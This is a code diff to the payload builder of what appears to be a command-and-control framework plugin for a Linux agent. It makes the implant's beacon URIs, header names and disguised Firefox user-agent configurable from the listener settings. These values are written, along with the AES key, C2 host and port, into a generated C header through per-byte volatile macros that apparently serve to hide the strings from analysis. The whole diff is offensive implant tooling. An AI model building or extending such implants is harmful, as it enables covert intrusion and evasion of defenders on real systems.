@@ -30,7 +30,7 @@ type PluginAgent struct{}
 
 // generateNaxConfigH produces nax_config.h with volatile per-byte write macros
 // for the AES key, C2 host and C2 port
-func generateNaxConfigH(aesKeyHex, c2Host string, c2Port int, extraHosts []string) ([]byte, error) {
+func generateNaxConfigH(aesKeyHex, c2Host string, c2Port int, extraHosts []string, preProfile map[string]string) ([]byte, error) {
 	key, err := hex.DecodeString(aesKeyHex)
 	if err != nil || len(key) != 16 {
 		return nil, fmt.Errorf("nax_config.h: invalid AES key %q", aesKeyHex)
@@ -90,20 +90,31 @@ func generateNaxConfigH(aesKeyHex, c2Host string, c2Port int, extraHosts []strin
 	}
 
 
+	// Pre-profile values — configured in listener Pre-Profile tab
+	uriGet := "/news/feed"
+	uriPost := "/api/submit"
+	beaconHdr := "X-Beacon-Id"
+	publicHdr := "X-NaX-Public"
+	ua := "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
+	if v, ok := preProfile["pre_get_uri"]; ok && v != "" { uriGet = v }
+	if v, ok := preProfile["pre_post_uri"]; ok && v != "" { uriPost = v }
+	if v, ok := preProfile["pre_beacon_hdr"]; ok && v != "" { beaconHdr = v }
+	if v, ok := preProfile["pre_public_hdr"]; ok && v != "" { publicHdr = v }
+	if v, ok := preProfile["pre_user_agent"]; ok && v != "" { ua = v }
+
 	buf.WriteString("\n/* Pre-profile URIs — per-char volatile stores */\n")
-	writeNaxCharWriteMacro(&buf, "NAX_URI_GET_WRITE", "/news/feed")
-	fmt.Fprintf(&buf, "#define NAX_URI_GET_LEN %du\n", len("/news/feed"))
-	writeNaxCharWriteMacro(&buf, "NAX_URI_POST_WRITE", "/api/submit")
-	fmt.Fprintf(&buf, "#define NAX_URI_POST_LEN %du\n", len("/api/submit"))
+	writeNaxCharWriteMacro(&buf, "NAX_URI_GET_WRITE", uriGet)
+	fmt.Fprintf(&buf, "#define NAX_URI_GET_LEN %du\n", len(uriGet))
+	writeNaxCharWriteMacro(&buf, "NAX_URI_POST_WRITE", uriPost)
+	fmt.Fprintf(&buf, "#define NAX_URI_POST_LEN %du\n", len(uriPost))
 
 	buf.WriteString("\n/* Pre-profile headers — per-char volatile stores */\n")
-	writeNaxCharWriteMacro(&buf, "NAX_BEACON_HDR_WRITE", "X-Beacon-Id")
-	fmt.Fprintf(&buf, "#define NAX_BEACON_HDR_LEN %du\n", len("X-Beacon-Id"))
-	writeNaxCharWriteMacro(&buf, "NAX_PUBLIC_HDR_WRITE", "X-NaX-Public")
-	fmt.Fprintf(&buf, "#define NAX_PUBLIC_HDR_LEN %du\n", len("X-NaX-Public"))
+	writeNaxCharWriteMacro(&buf, "NAX_BEACON_HDR_WRITE", beaconHdr)
+	fmt.Fprintf(&buf, "#define NAX_BEACON_HDR_LEN %du\n", len(beaconHdr))
+	writeNaxCharWriteMacro(&buf, "NAX_PUBLIC_HDR_WRITE", publicHdr)
+	fmt.Fprintf(&buf, "#define NAX_PUBLIC_HDR_LEN %du\n", len(publicHdr))
 
 	buf.WriteString("\n/* User-Agent — per-char volatile stores */\n")
-	ua := "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
 	writeNaxCharWriteMacro(&buf, "NAX_UA_WRITE", ua)
 	fmt.Fprintf(&buf, "#define NAX_UA_LEN %du\n", len(ua))
 
@@ -321,7 +332,19 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		c2h := listenerC2Host
 		if c2h == "" { c2h = "127.0.0.1" }
 		if isHttps && c2h == "" { c2h = "127.0.0.1" }
-		configH, err2 := generateNaxConfigH(aesKey, c2h, c2PortInt, callbackHosts)
+		// Read pre-profile from listener config (Pre-Profile tab)
+		preProfile := map[string]string{}
+		if len(profile.ListenerProfiles) > 0 {
+			var lpCfg map[string]any
+			if err3 := json.Unmarshal(profile.ListenerProfiles[0].Profile, &lpCfg); err3 == nil {
+				for _, k := range []string{"pre_get_uri", "pre_post_uri", "pre_beacon_hdr", "pre_public_hdr", "pre_user_agent"} {
+					if v, ok := lpCfg[k].(string); ok && v != "" {
+						preProfile[k] = v
+					}
+				}
+			}
+		}
+		configH, err2 := generateNaxConfigH(aesKey, c2h, c2PortInt, callbackHosts, preProfile)
 		if err2 != nil {
 			return nil, "", fmt.Errorf("linux agent: generateNaxConfigH: %w", err2)
 		}
